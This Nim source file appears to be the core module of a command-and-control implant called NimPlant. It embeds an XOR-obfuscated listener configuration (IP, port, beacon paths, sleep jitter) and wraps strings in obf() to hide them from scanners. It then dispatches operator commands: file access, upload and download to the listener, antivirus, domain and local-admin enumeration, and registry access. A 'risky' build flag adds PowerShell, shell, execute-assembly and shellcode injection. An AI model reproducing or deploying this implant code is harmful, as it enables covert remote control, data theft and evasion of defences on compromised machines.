import parsetoml, strutils, tables
from crypto import xorStringToByteSeq, xorByteSeqToString

include ../commands/[cat, cd, cp, curl, download, env, getAv, getDom, getLocalAdm, ls, mkdir, mv, ps, pwd, reg, rm, run, upload, wget, whoami]
when defined risky:
    include ../commands/risky/[executeAssembly, powershell, shell, shinject]

# Parse the configuration file
# This constant will be stored in the binary itself (hence the XOR)
proc parseConfig*() : Table[string, string] =
    var config = initTable[string, string]()

    # Allow us to re-write the static XOR key used for pre-crypto operations
    # This is handled by the Python wrapper at compile time, the default value shouldn't be used
    const xor_key {.intdefine.}: int = 459457925

    # Embed the configuration as a XORed sequence of bytes at COMPILE-time
    const embeddedConf = xorStringToByteSeq(staticRead(obf("../../config.toml")), xor_key)
    
    # Decode the configuration at RUNtime and parse the TOML to store it in a basic table
    var tomlConfig = parsetoml.parseString(xorByteSeqToString(embeddedConf, xor_key))
    config[obf("hostname")] = tomlConfig[obf("listener")][obf("hostname")].getStr()
    config[obf("listenerType")] = tomlConfig[obf("listener")][obf("type")].getStr()
    config[obf("listenerIp")] = tomlConfig[obf("listener")][obf("ip")].getStr()
    config[obf("listenerPort")] = $tomlConfig[obf("listener")][obf("port")].getInt()
    config[obf("listenerRegPath")] = tomlConfig[obf("listener")][obf("registerPath")].getStr()
    config[obf("listenerTaskPath")] = tomlConfig[obf("listener")][obf("taskPath")].getStr()
    config[obf("listenerResPath")] = tomlConfig[obf("listener")][obf("resultPath")].getStr()

    config[obf("killTime")] = $tomlConfig[obf("nimplant")][obf("killTimeHours")].getInt()
    config[obf("sleepTime")] = $tomlConfig[obf("nimplant")][obf("sleepTimeSeconds")].getInt()
    config[obf("sleepJitter")] = $tomlConfig[obf("nimplant")][obf("sleepJitterPercent")].getInt()
    config[obf("userAgent")] = tomlConfig[obf("nimplant")][obf("userAgent")].getStr()

    return config     

# Parse user commands that do not affect the listener object here
proc parseCmd*(li : Listener, cmd : string, args : seq[string]) : string =

    try:
        case cmd:
            of obf("cat"):
                result = cat(args)
            of obf("cd"):
                result = cd(args)
            of obf("cp"):
                result = cp(args)
            of obf("curl"):
                result = curl(li, args)
            of obf("download"):
                result = download(li, args)
            of obf("env"):
                result = env()
            of obf("getav"):
                result = getAv()
            of obf("getdom"):
                result = getDom()
            of obf("getlocaladm"):
                result = getLocalAdm()
            of obf("ls"):
                result = ls(args)
            of obf("mkdir"):
                result = mkdir(args)
            of obf("mv"):
                result = mv(args)
            of obf("ps"):
                result = ps()
            of obf("pwd"):
                result = pwd()
            of obf("reg"):
                result = reg(args)
            of obf("rm"):
                result = rm(args)
            of obf("run"):
                result = run(args)
            of obf("upload"):
                result = upload(li, args)
            of obf("wget"):
                result = wget(li, args)
            of obf("whoami"):
                result = whoami()
            else:
                # Parse risky commands, if enabled
                when defined risky:
                    case cmd:
                        of obf("execute-assembly"):
                            result = executeAssembly(li, args)
                        of obf("powershell"):
                            result = powershell(args)
                        of obf("shell"):
                            result = shell(args)
                        of obf("shinject"):
                            result = shinject(li, args)
                        else:
                            result = obf("ERROR: An unknown command was received.")
                else:
                    result = obf("ERROR: An unknown command was received.")
    
    # Catch unhandled exceptions during command execution (commonly OS exceptions)
    except:
        let
            msg = getCurrentExceptionMsg()

        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg